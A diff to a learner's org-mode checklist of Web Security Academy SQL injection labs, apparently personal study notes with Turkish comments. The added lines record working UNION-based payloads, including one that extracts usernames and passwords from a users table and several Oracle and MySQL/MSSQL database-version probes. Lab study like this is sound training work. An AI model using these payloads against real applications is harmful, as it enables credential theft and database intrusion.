@@ -1,12 +1,25 @@
+-*- org-emphasis-alist: (("*" bold) ("/" italic) ("_" underline) ("=" org-verbatim verbatim) ("~" org-code verbatim) ("+" (:strike-through nil))); -*-
 * Web Security Academy All labs
 * SQL injection
 ** DONE LAB SQL injection UNION attack, determining the number of columns returned by the query
 ** DONE LAB SQL injection UNION attack, finding a column containing text
 ** DONE LAB SQL injection UNION attack, retrieving data from other tables
-** TODO LAB SQL injection UNION attack, retrieving multiple values in a single column
-** TODO LAB SQL injection attack, querying the database type and version on Oracle
-** TODO LAB SQL injection attack, querying the database type and version on MySQL and Microsoft
+** DONE LAB SQL injection UNION attack, retrieving multiple values in a single column
+once colonlari bulduk nulla -> GET /filter?category=Lifestyle'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users-- HTTP/1.1
+** DONE LAB SQL injection attack, querying the database type and version on Oracle
+once nulladik 
+'+UNION+SELECT+null,null+FROM+DUAL--
+'+UNION+SELECT+null,'abc'+FROM+DUAL--
+'+UNION+SELECT+'abc','def'+FROM+DUAL--  first fount text olan yerleri bulduk sonra da asagidakiyle versiyon geldi
+GET /filter?category=Pets'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/1.1
+'+UNION+SELECT+banner+FROM+v$version
+** DONE LAB SQL injection attack, querying the database type and version on MySQL and Microsoft
+GET /filter?category=Pets'+UNION+SELECT+'abc','def'# HTTP/1.1 -> kolonlari bulduk 
+'+UNION+SELECT+@@version,+NULL# -> # -> mysql 
+'UNION+SELECT+@@version--
+'UNION+SELECT+/*!32302+1/0,+*/+1+FROM+tablename
 ** TODO LAB SQL injection attack, listing the database contents on non-Oracle databases
+
 ** TODO LAB SQL injection attack, listing the database contents on Oracle
 ** TODO LAB Blind SQL injection with conditional responses
 ** TODO LAB Blind SQL injection with conditional errors
